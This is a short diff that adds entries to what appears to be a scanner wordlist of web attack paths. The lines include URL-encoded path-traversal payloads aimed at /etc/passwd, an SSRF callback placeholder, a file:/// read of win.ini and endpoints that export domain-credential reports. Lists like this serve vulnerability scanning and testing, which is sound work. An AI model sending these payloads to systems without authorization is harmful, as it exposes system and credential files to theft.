@@ -83,3 +83,11 @@
 /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 /services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
+/path/to/vulnerable/endpoint
+/home/download
+/processexecution/DownloadExcelFile/Domain_Credential_Report_Excel
+/processexecution/DownloadExcelFile/Process_Report_Excel
+/processexecution/DownloadExcelFile/Infrastructure_Report_Excel
+/processexecution/DownloadExcelFile/Resolver_Report_Excel
+/api/geojson?url=file:///c://windows/win.ini
+/file/../../../../../../../../../../../../../../../../../..{{path}}
